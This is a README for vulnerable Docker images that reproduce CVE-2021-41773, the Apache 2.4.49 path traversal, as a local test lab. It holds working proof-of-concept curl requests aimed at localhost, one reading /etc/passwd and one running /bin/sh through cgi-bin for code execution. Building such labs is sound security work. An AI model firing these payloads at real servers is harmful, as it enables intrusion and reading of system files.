# Vulnerable docker images for CVE-2021-41773 Apache path traversal

This vulnerabiltiy *only* applies to version 2.4.49 that have specific non-default configs. In certain situations this can result in either file read or code execution.

## Vulnerable file read config

Containers can be pulled directly from Docker Hub using

```podman pull quay.io/vuln/cve-2021-41773:no-cgi```

and executed using

```podman run -dit -p 8080:8080 quay.io/vuln/cve-2021-41773:no-cgi```

The Apache logs can be viewed using below, or just exlude the "-dit" from the above run command to stream stdio
```podman logs <container-id>```

### PoC for file read

```curl http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd```

## Vulnerable RCE config

Containers can be pulled directly from Docker Hub using

```podman pull quay.io/vuln/cve-2021-41773:with-cgi```

and executed using

```podman run -dit -p 8080:8080 quay.io/vuln/cve-2021-41773:with-cgi```

The Apache logs can be viewed using below, or just exlude the "-dit" from the above run command to stream stdio
```podman logs <container-id>```

### PoC for RCE

```curl 'localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;id'```

## Build custom Container containers

Modify and build your own versions using the Dockerfile and template httpd.conf files in the subdirectories

- Use ./no-cgi for the config vulnerable to file read
- Use ./with-cgi for the config vulnerable to code execution
